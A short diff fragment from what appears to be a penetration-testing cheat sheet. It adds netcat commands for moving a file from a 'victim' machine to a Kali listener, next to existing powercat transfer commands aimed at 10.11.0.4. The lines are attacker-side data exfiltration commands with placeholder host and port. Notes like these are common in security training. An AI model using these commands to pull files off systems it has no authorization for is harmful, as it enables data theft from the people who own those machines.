@@ -251,6 +251,13 @@ sudo nc -lnvp 443 > receiving_powercat.ps1
 
 on Windows:
 powercat -c 10.11.0.4 -p 443 -i C:\Users\admin\powercat.ps1
+
+--------Using nc----------
+on victim:
+cat [filename] | nc [kali_ip] [port]
+
+on kali:
+nc -lnvp [port] > [output_file]
 ```
 
 ### enumSPN.ps1
